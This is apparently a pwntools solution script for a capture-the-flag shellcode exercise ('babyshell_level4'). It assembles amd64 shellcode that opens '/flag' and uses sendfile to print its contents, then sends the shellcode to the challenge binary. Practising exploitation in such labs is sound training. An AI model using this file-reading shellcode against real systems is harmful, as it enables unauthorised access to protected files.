from pwn import *

r = process('/challenge/babyshell_level4')

context.arch='amd64'
payload = asm(
    '''
    xor r9, r9
    mov r9, 0x00000067616c662f
    push r9

    xor r8, r8

    next:
    push r8
    pop rax
    push r8
    pop rsi
    push r8
    pop rdi
    push r8
    pop rdx

    mov eax, 2
    push rsp
    pop rdi
    syscall

    mov edi, 1
    mov esi, eax
    mov edx, 0
    mov esi, eax
    mov edx, 0
    mov r10, 1000
    mov eax, 40
    syscall


    '''
)

#payload = payload.replace(b'\x00',b'')
print(payload)
r.send(payload)
r.interactive()